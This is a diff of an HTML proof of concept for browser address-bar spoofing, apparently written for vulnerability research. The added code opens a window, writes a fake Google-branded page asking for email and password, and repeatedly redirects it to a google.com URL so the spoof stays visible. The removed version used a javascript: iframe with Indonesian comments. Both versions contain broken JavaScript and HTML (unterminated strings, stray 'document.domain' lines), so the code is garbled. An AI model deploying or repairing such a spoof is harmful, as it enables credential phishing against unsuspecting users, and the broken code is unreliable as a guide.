@@ -1,23 +1,24 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <button onclick="spoof()">Click to spoof</button>
-
-    <script>
-      function spoof() {
-        // 1. Buka tab baru ke domain target (untuk spoof address bar)
-        let win = window.open("https://www.google.com:1234", "_blank");
-
-        // 2. Tunggu 2 detik sebelum menampilkan prompt palsu
-        setTimeout(function () {
-          document.getElementById("iframe").src =
-            "javascript:let (document.domain)
-        }, 3000); // 2000 ms = 2 detik
-      }
-
-      spoof(); // Auto-run saat halaman dibuka
-    </script>
-
-    <iframe id="iframe" style="display:none;" src=""></iframe>
-  </body>
+<body>
+<button onclick="spoof()">Click to spoof</button>
+<script>
+function spoof() {
+    let win = window.open("", "_blank");
+    let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
+        '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
+        'document.domain
+        '<h1>This is NOT Google!</h1>' +
+        '<p>Please enter your credentials:</p>' +
+        '<input>email</input>' +
+        '<input>password</input>' +
+        '</div>';
+    win.document.write(payload);
+    win.document.close();
+    setInterval(function() {
+        win.location.replace("https://www.google.com:8080");
+    }, 10);  // Small interval to preserve the spoof
+}
+</script>
+</body>
 </html>
